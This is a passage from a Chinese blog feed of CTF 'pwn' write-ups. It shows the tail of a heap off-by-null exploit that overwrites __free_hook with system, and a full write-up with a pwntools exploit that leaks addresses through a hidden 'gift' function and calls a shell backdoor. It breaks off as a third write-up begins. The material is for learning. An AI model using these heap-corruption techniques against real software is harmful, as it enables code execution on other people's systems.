class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">3</span>,<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">4</span>,<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;d&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">0xf0</span> + p64(<span class=\"number\">0x100</span>))</span><br><span class=\"line\"><span class=\"comment\">#这里写一个0x100是为了绕过检查，因为之前的0x111被改成了0x100</span></span><br><span class=\"line\"><span class=\"comment\">#ptmalloc会根据nextchunk的prev_size字段检查是否大小匹配。这里写入0x100的地方正好是利用off-by-null漏洞后nextchunk的prev_size字段。</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">    alloc(i,<span class=\"number\">0x108</span>,<span class=\"string\">b&#x27;p&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">    free(i)</span><br><span class=\"line\"><span class=\"comment\"># tcache填充 </span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x19</span>,<span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x18</span> + p8(<span class=\"number\">0</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;d&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">5</span>,<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;e&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>,<span class=\"number\">24</span>):</span><br><span class=\"line\">    alloc(i,<span class=\"number\">0x88</span>,<span class=\"string\">b&#x27;p&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>,<span class=\"number\">24</span>):</span><br><span class=\"line\">    free(i)</span><br><span class=\"line\"><span class=\"comment\"># 让2  free到unsortedbin里</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)  <span class=\"comment\"># 与之前残留的0x110一起合并 注意这个3的位置  0x90+0x110 =0x1a0 </span></span><br><span class=\"line\">alloc(<span class=\"number\">6</span>,<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;\\xa0&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">5</span>) <span class=\"comment\"># 这里也很关键,再次释放5,5又与前面的2组合为</span></span><br><span class=\"line\">show(<span class=\"number\">6</span>)</span><br><span class=\"line\">leak_libc = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(leak_libc))</span><br><span class=\"line\">libc_base = leak_libc - <span class=\"number\">0x00007f74b3a5cca0</span> + <span class=\"number\">0x7f74b3671000</span> - <span class=\"number\">0x200</span></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,<span class=\"number\">0xa0</span>,p8(<span class=\"number\">0</span>) * <span class=\"number\">0x80</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x50</span>) + p64(free_hook))</span><br><span class=\"line\">pause()</span><br><span class=\"line\">alloc(<span class=\"number\">7</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">8</span>,<span class=\"number\">0x40</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\">#log.success(hex(libc_base))</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>libc.symbols 覆盖的到底是什么呢?</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/",
            "title": "pwn入门-28-高级网络攻防考试一题",
            "date_published": "2023-06-02T13:00:51.000Z",
            "content_html": "<p>​\t\t在考试的时候没有做出来,考完后和老曹交流学会了,主要卡住的点,是走错了方向,一直在考虑堆的漏洞怎么利用,其实不是堆的漏洞,怎么说呢,其实是一个知识点的事,init_array这个节,会进行一些初始化操作,不知道确实很难搞…不过其实也不是没有办法,其实可以进行一些全局搜索之类的,寻找线索.</p>\n<p>​\t\t题目文件: 本链接加attachments.tar.gz</p>\n<h1 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h1><h2 id=\"寻找对应函数\"><a href=\"#寻找对应函数\" class=\"headerlink\" title=\"寻找对应函数\"></a>寻找对应函数</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (__fastcall *)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, <span class=\"type\">char</span> **, <span class=\"type\">char</span> **))sub_14A9)(a1, a2, a3);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ((<span class=\"type\">void</span> (__fastcall *)(<span class=\"type\">const</span> <span class=\"type\">char</span> *))sub_1531)(a1);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;choice: &quot;</span>);</span><br><span class=\"line\">    a1 = <span class=\"string\">&quot;%d&quot;</span>;</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">4</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    ((<span class=\"type\">void</span> (*)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, ...))((<span class=\"type\">char</span> *)*(&amp;off_5000 + v4 - <span class=\"number\">1</span>) + <span class=\"number\">0xDEADBEEF</span>LL))(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_1531</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. add&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. delete&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. edit&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4. exit&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t一上来看sub_1531是能看到菜单的,但是很明显,下面没有对应的函数,就感到很奇怪了,(<font color=\"red\">其实下次可以直接在ida的函数列表里找,如果不是花指令的话,花指令的话,还是直接看汇编,看有没有红色的代码</font>)</p>\n<p>​\t\t当时是在gdb中动态调试找到的对应的函数</p>\n<p>​\t\t同时发现了一个gift函数,用来泄露地址的,还发现了一个后门函数,可以直接getshell,于是现在的问题就变成了怎么执行这个后门函数呢? 也就是怎么劫持控制流, 覆盖返回地址 or 利用堆进行任意内存读写, 似乎 都不太行…于是就卡住了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_1206</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Ok, you find the gift&quot;</span>);</span><br><span class=\"line\">  v0 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%#lx, %#lx, %#lx\\n&quot;</span>, sub_1206, &amp;write, v0);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v2 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_11C9</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"柳暗花明差一村\"><a href=\"#柳暗花明差一村\" class=\"headerlink\" title=\"柳暗花明差一村\"></a>柳暗花明差一村</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  ((<span class=\"type\">void</span> (*)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, ...))((<span class=\"type\">char</span> *)*(&amp;off_5000 + v4 - <span class=\"number\">1</span>) + <span class=\"number\">0xDEADBEEF</span>LL))(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\"></span><br><span class=\"line\">.data:<span class=\"number\">0000000000005000</span> off_5000        dq <span class=\"number\">0F</span>FFFFFFF21525389h   ; DATA XREF: main+A0↑o</span><br><span class=\"line\">.data:<span class=\"number\">0000000000005008</span>                 dq <span class=\"number\">0F</span>FFFFFFF21525477h</span><br><span class=\"line\">.data:<span class=\"number\">0000000000005010</span>                 dq <span class=\"number\">0F</span>FFFFFFF21525518h</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t当时在main函数中,看到了这个,也理解了off_5000是data节中的数据,利用这里的数据进行一些运算,然后就到达了函数地址,例如0位置,运算后就是add函数的位置,但是 gift和后门函数,都在内存中没有这个偏移,堆虽然可以写,但是不知道堆的地址呀,但gift可以泄露,但gift怎么调用呢??  于是就卡死了………</p>\n<p>​\t\t<font color=\"red\">其实这里可以尝试爆破的…(我觉得),后面有时间可以试试</font></p>\n<p>​\t\t于是就在这里卡死了…就像开头提的一样,其实在init_array中有初始化这个操作,保存了gift对应的地址,怎么说呢…应该让自己多学一点工具,辅助自己去探索可能的路径</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/image-20230602223110772.png\" alt=\"image-20230602223110772\"></p>\n<h2 id=\"正解\"><a href=\"#正解\" class=\"headerlink\" title=\"正解\"></a>正解</h2><p>​\t\telf执行时会先走这个init,这里面有个sub_144E,就是它把gift函数加载进去了,能够看到,它加载到的地址的偏移就是0x29C0</p>\n<p>&amp;0xFFFFFFFFFFFFF000LL是干了啥呢? 与之后就是程序0x5000的位置,是为了得到这个位置,然后+0x29C0就是存储gift的地方</p>\n<p>​\t\t不过这里为啥是0xDEADBF61LL,这是什么逻辑,后面在main中要+0xDEADBEEFLL,</p>\n<p>​\t\t所以0x1278 - 0xDEADBF61 +0xDEADBEEF &#x3D; 0x1206,就是gift的地址,所以这个地址应该是这个原因,因为要考虑到pie,所以要用一个函数或者变量的地址,这里用了0x1278的, 和它差多少呢?  就是  0x1206  -  0xDEADBEEF-0x1278,也就是-0xdeadbf61</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D60                 ;org <span class=\"number\">3</span>D60h</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D60 off_3D60        dq offset sub_11C0      ; DATA XREF: LOAD:<span class=\"number\">0000000000000168</span>↑o</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D60                                         ; LOAD:<span class=\"number\">00000000000002F</span>0↑o</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D68                 dq offset sub_144E</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D68 _init_array     ends</span><br><span class=\"line\">.init_array:<span class=\"number\">0000000000003</span>D68</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_144E</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  *(_QWORD *)(((<span class=\"type\">unsigned</span> __int64)&amp;unk_5018 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL) + <span class=\"number\">0x29C0</span>) = (<span class=\"type\">char</span> *)sub_1278 - <span class=\"number\">0xDEADBF61</span>LL;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以就可以先通过调用gift来进行泄露地址,0x29C0 &#x3D; 10688 , 10688&#x2F;8 &#x3D; 1336,这是因为指针的偏移,按照char类型来算????? 是吗?</p>\n<p>​\t因为在main中还有个-1,所以是1337,输入1337就可以调用gift了!</p>\n<h2 id=\"最终步骤\"><a href=\"#最终步骤\" class=\"headerlink\" title=\"最终步骤\"></a>最终步骤</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">choice: <span class=\"number\">1337</span></span><br><span class=\"line\">Ok, you find the gift</span><br><span class=\"line\"><span class=\"number\">0x5557ed770206</span>, <span class=\"number\">0x7f1094c79d80</span>, <span class=\"number\">0x5557eea752a0</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t之前取这些数据的时候老出问题…….</p>\n<p>​\t\t先把前面的数据接收了,然后再接收三个值,怎么接收呢,可以按照长度来,但是感觉比较der,还是看老曹的..recvline之后strip去掉最后的空格,然后decode解码,然后通过”, “分割,这样gift就成了数组, 0 1 2 对应着三个值,就可以了!</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gift = (p.recvline().strip()).decode().split(<span class=\"string\">&#x27;, &#x27;</span>)</span><br><span class=\"line\">pie = <span class=\"built_in\">int</span>(gift[<span class=\"number\">0</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x1206</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(pie))</span></span><br><span class=\"line\">leak_heap_addr = <span class=\"built_in\">int</span>(gift[<span class=\"number\">2</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(hex(leak_heap_addr))</span></span><br><span class=\"line\">vul_addr = leak_heap_addr + <span class=\"number\">0x20</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后把后门地址写入堆地址,此时也有堆的地址了,再次利用main函数中的调用逻辑,调用就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">backdoor_addr = pie + <span class=\"number\">0x11c9</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;choice: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;content: &#x27;</span>)</span><br><span class=\"line\">p.send(p64(backdoor_addr - <span class=\"number\">0xdeadbeef</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">trigger_input = (vul_addr - pie - <span class=\"number\">0x5000</span>) <span class=\"comment\">// 8 + 1</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t&#x2F;&#x2F;是整除的意思</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\">p =remote(<span class=\"string\">&quot;xxxxx&quot;</span>, xxx)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;choice: &#x27;</span>, <span class=\"built_in\">str</span>(<span class=\"number\">1337</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Ok, you find the gift\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gift = (p.recvline().strip()).decode().split(<span class=\"string\">&#x27;, &#x27;</span>)</span><br><span class=\"line\">pie = <span class=\"built_in\">int</span>(gift[<span class=\"number\">0</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x1206</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(pie))</span></span><br><span class=\"line\">leak_heap_addr = <span class=\"built_in\">int</span>(gift[<span class=\"number\">2</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(hex(leak_heap_addr))</span></span><br><span class=\"line\">vul_addr = leak_heap_addr + <span class=\"number\">0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\">backdoor_addr = pie + <span class=\"number\">0x11c9</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;choice: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;content: &#x27;</span>)</span><br><span class=\"line\">p.send(p64(backdoor_addr - <span class=\"number\">0xdeadbeef</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">trigger_input = (vul_addr - pie - <span class=\"number\">0x5000</span>) // <span class=\"number\">8</span> + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;choice: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(trigger_input))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"待解决\"><a href=\"#待解决\" class=\"headerlink\" title=\"待解决\"></a>待解决</h1><p>这个题如果正向写代码,要怎么写呢?</p>\n<p>ida一开始进去不是main而是…这里是否…</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/",
            "title": "pwn入门-27-5月乙队月赛三题",
            "date_published": "2023-05-22T03:39:48.000Z",
            "content_html": "<p>​\t\t这次月赛的pwn,出的偏简单,终于能做出题来了……..不过在做题的时候很多小点有点卡,所以平常要把这些知识点,细节都补充完整和练熟.</p>\n<p>​\t\t题目文件: 本链接+题目文件名</p>\n<h1 id=\"1-easy-leak\"><a href=\"#1-easy-leak\" class=\"headerlink\" title=\"1.easy_leak\"></a>1.easy_leak</h1><p>​\t\t本身题目不难,但是自己越做越复杂了..整体的思路还是有待加强.</p>\n<h2 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hello, my beeeest friend!Also a small chal for you!Good luck!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. Read num&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. Write num&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;0. Exit&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span 